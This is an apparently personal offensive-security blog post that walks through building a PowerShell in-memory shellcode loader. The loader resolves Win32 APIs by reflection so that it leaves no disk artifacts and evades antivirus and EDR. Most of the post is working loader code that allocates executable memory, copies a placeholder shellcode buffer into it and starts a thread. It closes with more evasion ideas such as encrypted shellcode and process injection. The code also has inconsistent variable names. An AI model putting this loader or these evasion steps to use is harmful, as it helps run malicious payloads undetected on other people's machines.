---
title: "Circumventing Artifacts: Windows In-memory Shellcode Loader Leveraging Native APIs"
date: 2021-03-08
tags: [posts]
excerpt: "A dive in leveraging windows native APIs to run shellcode while circumventing the generation of artifacts."
---

Introduction
---

<img src="{{ site.url }}{{ site.baseurl }}/images/expezr.png" alt="">

---

While doing research in windows primary memory shellcode injection by leveraging win32 APIs (CreateThread, VirtualAlloc), I was also interested in how the use of this technique can be identified from a blue-team prerspective. This led me down a rabbit hole of exploring various artifacts created when using the Add-Type keyword in powershell to compile C# code contating Win32 API declarations. From a blue team perspective, the creation of these artifacts can be flagged as an indicator of compromise or malicious behavior.

In this blogpost, we will explore how to we can take this technique further by avoiding the creation of artifacts with the goal of evading anti-virus and EDR solutions. 

Exploring the Artifacts
---
We will be using powershell to compile C# allowing us to reference the MessageBox function of the win32 API. Process Explorer will also be used to identify the artifacts created during the compilation of our C# code.

Lets jump right in!

In the following code, user32.dll is imported and the function declaration of MessageBox is created. The Add-Type powershell keyword is then leveraged to compile the C# code containing the declaration. Finally, the MessageBox function will be called with the appropriate arguments.

Note that we are importing the P/Invoke APIs (using System; Using System.Runtime.InteropServices) in order to translate our C# data types to C. This satisfies the syntax requirements of the MessageBox function shown below. 

---
MessageBox (user32.dll) Syntax
```
int MessageBox(
    HWND hWnd, 
    LPCTSTR lpText, 
    LPCTSTR lpCaption, 
    UINT uType
);
```
---
Powershell

```
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)] #import dll
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options); #declaration
}
"@

Add-Type $User32 #add-type compilation of c# code
[User32]::MessageBox(0, "Hello world!", "HELLO", 0)
```
---

Before executing the powershell script, fire up Process Monitor and set a filter for powershell.exe. We can clear old events using Ctrl+X. Upon execution of the script, hit control Ctrl+F and search for ".cs". CreateFile, WriteFile, and CloseFile operations can be observed involving a .cs file containing our C# code and its resulting .dll. This suggests that the in-memory 'MessageBox' Runner has not operated completely in memory and has indeed written files to disk. This happens since the Add-Type keyword calls the csc compiler which in-turn creates the C# code file and then compiles it into a dynamicly linked library. This dll is then loaded into memory and both files are removed from disk. Note that the filenames are randomly generated during runtime. 

<img src="{{ site.url }}{{ site.baseurl }}/images/post_img/procmon.png" alt="">

By using the Get-Assemblies method on the CurrentDomain Object, we can also view all loaded assemblies; confirming that our .dll file has indeed been loaded into memory.

Avoiding Artifact Creation
---
Now that we have seen what artifacts are generated, instead of using the Add-Type keyword to compile our function declarations, we will obtain the address of our required functions in already loaded unmanaged dlls and call them. By leveraging this technique we are essentially eliminating the need to compile C# code; a stealthier approach for our soon-to-be completely in-memory shellcode runner.

In order to achieve this, we will proceed with the following steps:
* Identifying preloaded assemblies containing GetModuleHandle and GetProcAddress APIs
* Obtaining a handle to the desired preloaded assembly
* Using the Invoke method to call GetModuleHandle and obtain the address of an unmanaged dll (in our case user32.dll)
* Using GetProcAddress to determine the address of a function (MessageBox) in our chosen user32.dll
* Leveraging DelegateType Reflection to pair resolved MessageBox function address with its function prototype
* Calling MessageBox and ensuring that no artifacts are created
* Modifying our POC to eventually call CreateThread and VirtualAlloc with a buffer cointaining our shellcode
* Calling WaitForSingleObject to ensure our shell does not die instantly 

Identifying Preloaded Assemblies
---
In order to be able to dynamically look up win32 API function addresses we first need to locate a preloaded assembly containing the GetModuleHandle and GetProcAddress APIs. Note that to reduce output and perform a more targetted query, we need to search for assemblies for our two target functions that are declared as static (to avoid instantiation) and are marked as unsafe (Microsoft.Win32.UnsafeNativeMethods); allowing us to call them directly. 

<img src="{{ site.url }}{{ site.baseurl }}/images/post_img/get_assemb.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/post_img/system_dll.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/post_img/assemb_output.png" alt="">

As indicated in the screenshots above my target assembly is System.dll. After obtaining a handle to System.dll, the GetModuleHandle and GetProcAddress APIs can be invoked to obtain the memory address of MessageBox in user32.dll. To make this easier, the function presented below receives the target dll (user32.dll) and target function (MessageBox) and returns its memory address. 

```
function LookupFunc {	Param ($moduleName, $functionName) 
	
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') #get only unsafe	
        $tmp=@()	
        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
	@($moduleName)), $functionName)) } #get the address of the target method via a handle to the user supplied dll
```
---

To recap on what we have done up until now, this is a ~~junky~~ highlevel visual.

<img src="{{ site.url }}{{ site.baseurl }}/images/post_img/lucid_chart.png" alt="">

DelegateType Reflection
---
Now that the address to MessageBox has been obtained, the function prototype (Delegate in C#) must be declared in order to 'pair' the function's arguments and datatypes to its memory address. DelegateType Reflection can be leveraged to do this in Powershell without compiling C# code.

A delegate is normally created when an assembly is compiled (eg. using Add-Type keyword). In this case, the assembly will be manually created in memory and populated only using powershell. To do this we can use the following function.

```
function getDelegateType { 
	Param (		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, 
		[Parameter(Position = 1)] [Type] $delType = [Void] 
	) 

	$type = [AppDomain]::CurrentDomain. 
	DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
	[System.Reflection.Emit.AssemblyBuilderAccess]::Run). DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) 
	
	$type.DefineConstructor('RTSpecialName, HideBySig, Public', 
	[System.Reflection.CallingConventions]::Standard, $func). SetImplementationFlags('Runtime, Managed') 

	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed') 
	
	return $type.CreateType() 
} 
```
---
Combining the lookup function shown previously and the getDelegateType function, the target MessageBox function can now be called as shown below.

```
$MessageBoxAddr = LookupFunc user32.dll MessageBox
$MessageBoxDelType = getDelegateType @([IntPtr], [String], [String], [int])
([IntPtr])$MessageBox = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxAddr, $MessageBoxDelType)
$MessageBox.Invoke([IntPtr]::Zero,"Hello World!","HELLO",0)
```

Modifying the Script to execute Shellcode
---

The POC can now be modified to call VirtualAlloc and CreateThread to run shellcode. For this to be done, the lookupFunc will be used to find the address for both our target functions in kernel32.dll. Finally, the arguments sent to getDelegateType should reflect the data types of our target functions. See below. 

---
CreateThread
```
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  __drv_aliasesMem LPVOID lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);
```
VirutalAlloc
```
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```


Modified POC
---
```
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $shellc_buff = <SHELLCODE>

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $shelc_buff.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), 
(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
```
---

Completing the Shellcode Loader
---
The final piece of the shellcode loader consists of locating and calling the WaitForSingleObject API from kernel32.dll. Calling this function with the appropriate arguments will ensure that the shell will not instanteniously terminate and only stop when the shell is terminated by the operator. This part is left as an exercise.

---
WaitForSingleObject
```
DWORD WaitForSingleObject(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);
```

Room for Improvement
---
* system proxy awareness - To ensure the client can route outwards if a system proxy is present
* encrypted shellcode support - Another layer of evasion
* process injection and migration

Additional Sources
---
* https://www.powershellgallery.com/packages/HackSql/1.0.2/Content/Get-DelegateType.ps1
* https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
* https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
* https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
* https://github.com/dsnezhkov/typhoon/blob/master/Typhoon/Runners/DynCSharpRunner.cs
* https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html
* https://www.offensive-security.com/documentation/PEN300-Syllabus.pdf
* https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.getassemblies?view=net-5.0
* https://stackoverflow.com/questions/2170294/accessing-microsoft-win32-unsafenativemethods
* https://referencesource.microsoft.com/#mscorlib/microsoft/win32/unsafenativemethods.cs,097c03b9633b19cb,references

